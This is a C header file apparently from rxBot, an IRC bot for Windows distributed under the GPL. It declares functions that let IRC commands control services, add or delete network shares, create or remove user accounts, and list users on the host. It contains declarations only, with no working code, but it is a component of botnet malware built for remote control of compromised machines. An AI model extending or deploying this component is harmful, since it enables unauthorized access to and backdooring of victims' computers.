/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#ifndef NO_NET
enum {NET_ADD, NET_DELETE, NET_INFO, NET_START, NET_STOP, NET_PAUSE, NET_CONTINUE};

#define IsVSD(x) ((x)?("Yes"):("No"))

typedef struct NetCommand
{
	char *action;
	char *completed;
	DWORD control;
	
} NetCommand;

char *Services(int action, char *ServiceName);
DWORD ServiceControl(int option, char *ServiceName, DWORD dwControl=0, DWORD nArg=0, LPCTSTR *pArg=NULL); 
static char *ServiceError(DWORD svcError);
BOOL ListServices(SOCKET sock, char *chan, BOOL notice);
char *Shares(int action, char *ShareName, char *SharePath=NULL);
static char *AsWideString(const char *cszANSIstring);
NET_API_STATUS ShareAdd(char *ServerName, char *ShareName, char *SharePath);
NET_API_STATUS ShareDel(char *ServerName, char *ShareName);
BOOL ListShares(SOCKET sock, char *chan, BOOL notice, char *ServerName=NULL);
char *Users(int action, char *Username, char *Password, SOCKET sock, char *chan, BOOL notice);
NET_API_STATUS UserAdd(char *ServerName, char *Username, char *Password);
NET_API_STATUS UserDel(char *ServerName, char *Username);
NET_API_STATUS UserInfo(char *ServerName, char *Username, SOCKET sock, char *chan, BOOL notice);
BOOL ListUsers(SOCKET sock, char *chan, BOOL noice, char *ServerName=NULL);
static char *NasError(NET_API_STATUS nStatus);
char *NetSend(char *msg, SOCKET sock, char *chan, BOOL notice);
#endif
